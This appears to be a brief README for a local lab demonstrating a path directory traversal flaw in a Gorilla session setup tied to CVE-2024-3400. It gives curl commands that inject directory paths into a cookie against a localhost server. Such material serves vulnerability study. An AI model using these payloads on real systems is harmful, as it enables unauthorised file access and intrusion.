# A Gorilla Session Vulnerable to Path Directory Traversal

```bash
export SESSION_KEY=gorilla
```

```bash
go run escapezoo.go
```

# Path Directory Traversal

```bash
curl --cookie "zoo=$PREFIX/tmp" http://localhost:8080
```

```bash
curl --cookie "zoo=$HOME/" http://localhost:8080
```

# CVE-2024-3400 related vulnerability
